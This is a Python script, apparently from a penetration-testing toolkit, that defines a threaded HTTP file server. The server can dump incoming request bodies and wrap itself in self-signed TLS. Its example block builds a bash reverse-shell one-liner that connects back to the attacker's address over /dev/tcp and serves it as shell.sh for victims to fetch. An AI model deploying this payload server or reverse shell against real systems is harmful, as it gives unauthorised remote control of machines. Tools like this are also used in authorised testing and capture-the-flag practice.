#!/usr/bin/env python

from hackingscripts import util
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import sys
import os
import ssl

class FileServerRequestHandler(BaseHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_POST(self):
        self.do_GET()

    def do_GET(self):
        path = self.path if "?" not in self.path else self.path[0:self.path.find("?")]
        if path in self.server.files:
            data = self.server.files[path]
            self.send_response(200)
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404)
            self.end_headers()

        if path in self.server.dumpRequests:
            contentLength = self.headers.get('Content-Length')
            body = None

            if contentLength and int(contentLength) > 0:
                body = self.rfile.read(int(contentLength))

            print("==========")
            print(str(self.headers).strip())
            if body:
                print()
                print(body)
            print("==========")

    def log_message(self, format, *args):
        if self.server.logRequests:
            # BaseHTTPRequestHandler.log_message(format, *args)
            super().log_message(format, *args)

class HttpFileServer(HTTPServer):
    def __init__(self, addr, port):
        super().__init__((addr, port), FileServerRequestHandler)
        self.logRequests = False
        self.dumpRequests = []
        self.files = { }

    def addFile(self, name, data):
        if isinstance(data, str):
            data = data.encode("UTF-8")
        if not name.startswith("/"):
            name = "/" + name
        self.files[name.strip()] = data

    def addFile(self, name, data):
        if isinstance(data, str):
            data = data.encode("UTF-8")
        if not name.startswith("/"):
            name = "/" + name
        self.files[name.strip()] = data

    def dumpRequest(self, name):
        if not name.startswith("/"):
            name = "/" + name
        self.dumpRequests.append(name)

    def enableLogging(self):
        self.logRequests = True

    def enableSSL(self, keyFile=None, certFile=None):
        if keyFile is None:
            print("Generating certificate…")
            os.system("openssl req -new -x509 -keyout private.key -out server.crt -days 365 -nodes")
            certFile = "server.crt"
            keyFile = "private.key"

        self.socket = ssl.wrap_socket(self.socket,
            server_side=True,
            certfile=certFile,
            keyfile=keyFile,
            ssl_version=ssl.PROTOCOL_TLS,
            cert_reqs=ssl.CERT_NONE)

        # try:
        #     ssl._create_default_https_context = ssl._create_unverified_context
        # except AttributeError:
        #     print("Legacy Python that doesn't verify HTTPS certificates by default")
        #     pass

    def startBackground(self):
        t = threading.Thread(target=self.serve_forever)
        t.start()
        return t

# EXAMPLE
if __name__ == "__main__":
    listenPort = 4444 if len(sys.argv) < 2 else int(sys.argv[1])
    ipAddress = util.getAddress()

    rev_shell = "bash -i >& /dev/tcp/%s/%d 0>&1" % (ipAddress, listenPort)
    fileServer = HttpFileServer("0.0.0.0", 80)
    fileServer.addFile("shell.sh", rev_shell)
    fileServer.startBackground()
    print("Reverse Shell URL: http://%s/shell.sh" % ipAddress)
